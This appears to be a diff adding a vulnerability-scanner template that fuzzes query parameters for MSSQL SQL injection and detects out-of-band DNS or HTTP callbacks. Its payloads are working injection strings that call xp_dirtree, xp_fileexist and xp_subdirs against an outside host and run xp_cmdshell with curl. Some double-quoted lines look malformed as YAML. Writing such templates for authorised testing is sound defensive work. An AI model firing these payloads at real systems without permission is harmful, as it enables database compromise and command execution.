@@ -1,0 +1,40 @@
+id: fuzz-mssql-oob
+
+info:
+  name: MSSQL OOB via xp_cmdshell/xp_dirtree
+  author: openai
+  severity: high
+  tags: mssql,sqli,oob,dast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      mssql_oob:
+        - "1; exec master..xp_dirtree '\\\\{{interactsh-url}}\\\\abc'--"
+        - "1; exec master..xp_fileexist '\\\\{{interactsh-url}}\\\\abc'--"
+        - "1; exec master..xp_subdirs '\\\\{{interactsh-url}}\\\\abc'--"
+        - "1; exec xp_cmdshell 'curl http://{{interactsh-url}}/cmd'--"
+        - "1'; exec master..xp_dirtree '\\\\{{interactsh-url}}\\\\abc'--"
+        - "1'; exec master..xp_fileexist '\\\\{{interactsh-url}}\\\\abc'--"
+        - "1'; exec master..xp_subdirs '\\\\{{interactsh-url}}\\\\abc'--"
+        - "1'; exec xp_cmdshell 'curl http://{{interactsh-url}}/cmd'--"
+        - "1"; exec master..xp_dirtree '\\\\{{interactsh-url}}\\\\abc'--"
+        - "1"; exec master..xp_fileexist '\\\\{{interactsh-url}}\\\\abc'--"
+        - "1"; exec master..xp_subdirs '\\\\{{interactsh-url}}\\\\abc'--"
+        - "1"; exec xp_cmdshell 'curl http://{{interactsh-url}}/cmd'--"
+        
+    fuzzing:
+      - part: query
+        mode: single
+        fuzz:
+          - "{{mssql_oob}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
